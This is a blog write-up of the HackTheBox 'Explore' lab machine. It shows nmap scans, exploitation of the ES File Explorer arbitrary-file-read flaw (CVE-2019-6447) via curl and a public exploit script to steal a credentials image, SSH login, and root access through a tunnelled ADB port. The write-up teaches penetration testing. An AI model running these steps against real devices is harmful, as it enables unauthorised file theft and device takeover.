<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Explore | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Exploiting ES File Explorer and abusing ADB"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/explore/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Explore"><meta property="og:description" content="Exploiting ES File Explorer and abusing ADB"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/explore/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-10-30T17:36:39+07:00"><meta property="article:modified_time" content="2021-10-30T17:36:39+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341.png"><meta name=twitter:title content="HackTheBox - Explore"><meta name=twitter:description content="Exploiting ES File Explorer and abusing ADB"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Explore","item":"https://fahmifj.github.io/hackthebox/explore/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Explore","name":"HackTheBox - Explore","description":"Exploiting ES File Explorer and abusing ADB","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Explore features an ES File Explorer that is vulnerable to Arbitrary File Read, allowing me to obtain a picture containing SSH credentials. Enumerating the system reveals that the machine has debug mode enabled and ADB daemon running, these two can then be leveraged to obtain root access via ADB client.\nSkills Learned Exploiting ES File Explorer vulnerability Android enumeration and exploitation Tools Nmap Adb Reconnaissance Nmap Nmap scan on TCP ports discovers 5 open ports:\nSSH on port 2222 For port 5555, nmap identifies it as freeciv, but judging based on the OS, this can be ADB1. The rest 37817, 42135, and 59777 are HTTP servers. → root@kali «explore» «10.10.14.32» $ nmap -p- --min-rate 1000 --reason -oA nmap/all-tcp-explorer 10.10.10.247 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 17:39 EDT Nmap scan report for 10.10.10.247 Host is up, received reset ttl 63 (0.057s latency). Not shown: 65530 closed ports Reason: 65530 resets PORT STATE SERVICE REASON 2222/tcp open EtherNetIP-1 syn-ack ttl 63 5555/tcp filtered freeciv no-response 37817/tcp open unknown syn-ack ttl 63 42135/tcp open unknown syn-ack ttl 63 59777/tcp open unknown syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 38.81 seconds → root@kali «explore» «10.10.14.32» $ nmap -p2222,5555,37817,42135,59777 -sC -sV -oA nmap/all-tcp-script-explorer 10.10.10.247 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 17:47 EDT Nmap scan report for 10.10.10.247 Host is up (0.051s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 37817/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:36 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Sun, 27 Jun 2021 21:47:36 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Sun, 27 Jun 2021 21:47:41 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:57 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:41 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:57 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u003c=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:57 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Sun, 27 Jun 2021 21:47:57 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn't have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.80%I=7%D=6/27%Time=60D8F1F8%P=x86_64-pc-linux-gnu%r(NU SF:LL,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port37817-TCP:V=7.80%I=7%D=6/27%Time=60D8F1F8%P=x86_64-pc-linux-gnu%r(G SF:enericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Sun,\\x20 ...[SNIP]... Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds Enumeration TCP 37817 No reply given from 37817, it showed in a close state when I tried to rescan it.\nTCP 59777 \u0026 42135 - ES File Explorer If I search for port 59777 and 42135 on Google, the results show that these ports are belong to ES File Explorer.\nInteracting with port 59777 from the browser gives me the response below, and no further information given.\nIf I use nc, port 59777 returns with a forbidden error message.\n→ kali@kali «explore» «10.10.14.83» $ nc 10.10.10.247 59777 GET / HTTP/1.0 403 Forbidden Content-Type: text/plain Date: Sun, 9 Jul 2021 22:32:42 GMT FORBIDDEN: No directory listing For port 42135, interacting with it from nc or the browser both returns 404 not found message.\n→ kali@kali «explore» «10.10.14.83» $ nc 10.10.10.247 42135 GET / HTTP/1.1 HTTP/1.1 404 Not Found Server: ES Name Response Server Content-Type: text/html Content-Length: 9 Connection: close Not found Finding Vulnerabilities On Exploit-DB, there is one recent exploit for ES File Explorer, which was released 3 days after this box. This looks promising,\nFoothold Shell as kristi ES File Explorer CVE-2019-6447 The arbitrary file read vulnerability on ES File Explorer 4.1.9.7.4 is classified as CVE-2019-6447. This articles explains about the vulnerability, but I will just quote its overview part which states that:\nThe ES file browser creates an HTTP service bound to port 59777 at runtime, which provides 10+ commands for accessing data in user’s cell phone and executing the application; however, the service does not check this request. Test, resulting in a security breach.\nI can test for the vulnerability by sending a HTTP POST request containing one of the available commands like getDeviceInfo to http://10.10.10.247:59777:\n→ kali@kali «explore» «10.10.14.83» $ curl -d '{\"command\":\"getDeviceInfo\"}' http://10.10.10.247:59777 {\"name\":\"VMware Virtual Platform\", \"ftpRoot\":\"/sdcard\", \"ftpPort\":\"3721\"} And it was vulnerable!\nThis time I will grab this exploit. When sending listPics command, it returns with one interesting file name called creds.jpg\n→ kali@kali «exploits» «10.10.14.83» $ python3 esfile_cve2019-6447.py listPics 10.10.10.247 ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== name : concept.jpg time : 4/21/21 02:38:08 AM location : /storage/emulated/0/DCIM/concept.jpg size : 135.33 KB (138,573 Bytes) name : anc.png time : 4/21/21 02:37:50 AM location : /storage/emulated/0/DCIM/anc.png size : 6.24 KB (6,392 Bytes) name : creds.jpg time : 4/21/21 02:38:18 AM location : /storage/emulated/0/DCIM/creds.jpg size : 1.14 MB (1,200,401 Bytes) name : 224_anc.png time : 4/21/21 02:37:21 AM location : /storage/emulated/0/DCIM/224_anc.png size : 124.88 KB (127,876 Bytes) The file can be downloaded with getFile command and then supply the file path as the last argument.\n→ kali@kali «exploits» «10.10.14.83» $ python3 esfile_cve2019-6447.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== [+] Downloading file... [+] Done. Saved as `out.dat`. The saved image contains a set of creds: kristi:Kr1sT!5h@Rp3xPl0r3!\nSSH - Kristi These credentials works on SSH.\n→ kali@kali «exploits» «10.10.14.83» $ ssh -p 2222 kristi@10.10.10.247 Password authentication Password: :/ $ whoami \u0026\u0026 id \u0026\u0026 hostname u0_a76 uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768 localhost The username appeared as u0_a76 because each application on Android starting from OS 6.0+ is sandboxed. In this case the SSH server is a sandboxed application.\nThe user flag is on /sdcard/user.txt.\n:/sdcard $ ls -la total 68 drwxrwx--- 15 root everybody 4096 2021-04-21 02:12 . drwx--x--x 4 root everybody 4096 2021-03-13 17:16 .. drwxrwx--- 5 root everybody 4096 2021-03-13 17:30 .estrongs -rw-rw---- 1 root everybody 72 2021-07-09 07:16 .userReturn drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Alarms drwxrwx--- 3 root everybody 4096 2021-03-13 17:16 Android drwxrwx--- 2 root everybody 4096 2021-04-21 02:38 DCIM drwxrwx--- 2 root everybody 4096 2021-03-13 17:37 Download drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Movies drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Music drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Notifications drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Pictures drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Podcasts drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Ringtones drwxrwx--- 3 root everybody 4096 2021-03-13 17:30 backups drwxrwx--- 2 root everybody 4096 2021-04-21 02:12 dianxinos -rw-rw---- 1 root everybody 33 2021-03-13 18:28 user.txt :/sdcard $ cat user.txt f3201...[SNIP]... Privilege Escalation Shell as root ADB While enumerating this machine, I found a xbin folder under /system directory.\n:/system $ ls -l total 212 drwxr-xr-x 41 root root 4096 2020-03-25 00:26 app drwxr-xr-x 3 root shell 8192 2020-03-25 00:26 bin -rw------- 1 root root 2824 2020-03-24 23:39 build.prop ...[SNIP]... drwxr-xr-x 2 root shell 8192 2020-03-25 00:26 xbin When I was an active XDA member (2011~2013), the existence of /system/xbin or /system/xbin/su indicated that the device was rooted back then (I just found out that this method2 is still used today).\nTypically people who rooted their device has a debug mode enabled, therefore, I’m guessing that the only way to gain a root shell from here is through adb (android debug bridge) on port 5555.\n:/ $ netstat -tlpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program Name tcp 0 1 10.10.10.247:60138 1.0.0.1:853 SYN_SENT - tcp 0 1 10.10.10.247:48216 1.1.1.1:853 SYN_SENT - tcp6 0 0 :::42135 :::* LISTEN - tcp6 0 0 :::59777 :::* LISTEN - tcp6 0 0 ::ffff:10.10.10.2:33035 :::* LISTEN - tcp6 0 0 :::2222 :::* LISTEN 3405/net.xnano.android.sshserver tcp6 0 0 ::ffff:127.0.0.1:38415 :::* LISTEN - tcp6 0 0 :::5555 :::* LISTEN - tcp6 0 0 ::ffff:127.0.0.1:5555 ::ffff:127.0.0.1:56602 ESTABLISHED - tcp6 0 0 ::ffff:127.0.0.1:56604 ::ffff:127.0.0.1:5555 ESTABLISHED 3405/net.xnano.android.sshserver tcp6 0 0 ::ffff:127.0.0.1:5555 ::ffff:127.0.0.1:56604 ESTABLISHED - tcp6 0 624 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55618 ESTABLISHED 3405/net.xnano.android.sshserver tcp6 0 0 ::ffff:127.0.0.1:56602 ::ffff:127.0.0.1:5555 ESTABLISHED 3405/net.xnano.android.sshserver tcp6 0 0 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55602 ESTABLISHED 3405/net.xnano.android.sshserver As I only have ADB on my host device (Windows), I created two SSH tunnels: Windows:5555 \u003c-SSH-\u003e Kali:5555 \u003c-SSH-\u003e Explorer:5555.\nOn my Windows:\n$ ssh kali -L 5555:localhost:5555 On my Kali:\n$ ssh -p 2222 kristi@10.10.10.247 -L 5555:localhost:5555 Back on my Windows, I will connect to the Explore ADB server which is now accessible over port 5555 on my localhost.\nexplore › adb tcpip 5555 * daemon not running; starting now at tcp:5037 * daemon started successfully restarting in TCP mode port: 5555 explore › adb connect localhost:5555 connected to localhost:5555 explore › adb devices List of devices attached localhost:5555 device But it when I want to get a shell, it returns with\nexplore › adb shell error: more than one device/emulator and that can be resolved by specifying the device with -s option.\nexplore › adb devices List of devices attached emulator-5554 device localhost:5555 device explore › adb -s localhost:5555 shell x86_64:/ $ id uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0 When I type su, I’m in the root shell!\nx86_64:/ $ su :/ # id uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0 The root flag can be found using the following command:\n:/ # find / -type f -name \"root.txt\" 2\u003e/dev/null /data/root.txt :/ # cat /data/root.txt f04fc...[SNIP]... https://developer.android.com/studio/command-line/adb ↩︎\nhttps://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not ↩︎\n","wordCount":"1726","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341.png","datePublished":"2021-10-30T17:36:39+07:00","dateModified":"2021-10-30T17:36:39+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/explore/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Explore</h1><p class=post-description>Exploiting ES File Explorer and abusing ADB</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 30, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-37817 aria-label="TCP 37817">TCP 37817</a></li><li><a href=#tcp-59777--42135---es-file-explorer aria-label="TCP 59777 &amp;amp; 42135 - ES File Explorer">TCP 59777 & 42135 - ES File Explorer</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-kristi aria-label="Shell as kristi">Shell as kristi</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341_hu1dff99881abc15c5cc00a339bf2f3ece_115653_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341_hu1dff99881abc15c5cc00a339bf2f3ece_115653_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341_hu1dff99881abc15c5cc00a339bf2f3ece_115653_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341.png 875w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/explore/imgs/image-20211030224946341.png alt="HackTheBox - Explore" width=875 height=645><p>HackTheBox - Explore</p></figure><p>Explore features an ES File Explorer that is vulnerable to Arbitrary File Read, allowing me to obtain a picture containing SSH credentials. Enumerating the system reveals that the machine has debug mode enabled and ADB daemon running, these two can then be leveraged to obtain root access via ADB client.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Exploiting ES File Explorer vulnerability</li><li>Android enumeration and exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Adb</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p><code>Nmap</code> scan on TCP ports discovers 5 open ports:</p><ul><li>SSH on port 2222</li><li>For port 5555, nmap identifies it as freeciv, but judging based on the OS, this can be ADB<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</li><li>The rest 37817, 42135, and 59777 are HTTP servers.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «explore» «10.10.14.32» 
</span></span><span class=line><span class=cl>$ nmap -p- --min-rate <span class=m>1000</span> --reason -oA nmap/all-tcp-explorer 10.10.10.247
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-27 17:39 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.247
</span></span><span class=line><span class=cl>Host is up, received reset ttl <span class=m>63</span> <span class=o>(</span>0.057s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65530</span> closed ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65530</span> resets
</span></span><span class=line><span class=cl>PORT      STATE    SERVICE      REASON
</span></span><span class=line><span class=cl>2222/tcp  open     EtherNetIP-1 syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>5555/tcp  filtered freeciv      no-response
</span></span><span class=line><span class=cl>37817/tcp open     unknown      syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>42135/tcp open     unknown      syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>59777/tcp open     unknown      syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 38.81 seconds
</span></span><span class=line><span class=cl>→ root@kali «explore» «10.10.14.32» 
</span></span><span class=line><span class=cl>$ nmap -p2222,5555,37817,42135,59777 -sC -sV -oA nmap/all-tcp-script-explorer 10.10.10.247         
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-27 17:47 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.247
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.051s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE    SERVICE VERSION
</span></span><span class=line><span class=cl>2222/tcp  open     ssh     <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   NULL: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    SSH-2.0-SSH Server - Banana Studio
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>5555/tcp  filtered freeciv
</span></span><span class=line><span class=cl>37817/tcp open     unknown
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:36 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>22</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid request line:
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>412</span> Precondition Failed
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:36 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>501</span> Not Implemented
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:41 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>29</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Method not supported: OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>   Help: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:57 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>26</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid request line: HELP
</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:41 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>39</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     valid protocol version: RTSP/1.0
</span></span><span class=line><span class=cl><span class=p>|</span>   SSLSessionReq: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:57 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>73</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid request line: 
</span></span><span class=line><span class=cl><span class=p>|</span>     ?G???,???<span class=sb>`</span>~?
</span></span><span class=line><span class=cl><span class=p>|</span>     ??<span class=o>{</span>????w????&lt;<span class=o>=</span>?o?
</span></span><span class=line><span class=cl><span class=p>|</span>   TLSSessionReq: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:57 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>71</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid request line: 
